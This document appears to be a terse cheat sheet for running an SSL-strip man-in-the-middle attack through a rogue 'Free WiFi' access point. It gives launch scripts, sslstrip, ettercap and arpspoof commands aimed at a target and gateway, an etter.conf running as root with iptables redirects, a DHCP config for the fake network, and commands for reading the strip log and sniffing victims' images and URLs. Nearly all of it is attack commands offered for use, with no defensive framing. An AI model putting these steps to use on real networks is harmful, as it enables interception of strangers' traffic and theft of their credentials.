# SSL Strip

# add a fix me script, using assets
	./airbase-start.sh
	./rogue-mitm.sh
	sslstrip -f -p -k 10000
	ettercap -p -u -T -q -i at0
	driftnet -i eth0

## Manual Setup

	nano etter.conf
```
[privs]
ec_uid = 0                # nobody is the default
ec_gid = 0                # nobody is the default

# if you use iptables:
redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %por$
redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %po$
```

	nano dhcpd.conf
```
subnet 10.0.0.0 netmask 255.255.255.0 {
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;

option domain-name "Free WiFi";
option domain-name-servers 10.0.0.1;

range 10.0.0.20 10.0.0.50;
}
```

## Commands

	netdiscover

nmap -sS -O {gateway}
	nmap -sS -O 192.168.1.1/24

arpspoof -i {interface} -t {target} -r {gateway}
	arpspoof -i eth0 -t 192.168.1.25 -r 192.168.1.1

sslstrip -f -p -k {port}
	sslstrip -f -p -k 10000

ettercap -p -u -T -q -i {interface}
	ettercap -p -u -T -q -i at0

---

# read strip log
	cat ~/sslstrip.log

# wireshark
	tshark -D
	dumpcap -i wlan0
	dumpcap -i 1 -b files:100 -b filesize:30000 -w internet.pcap

# monitor
	driftnet -i wlan0
	urlsnarf -i wlan0

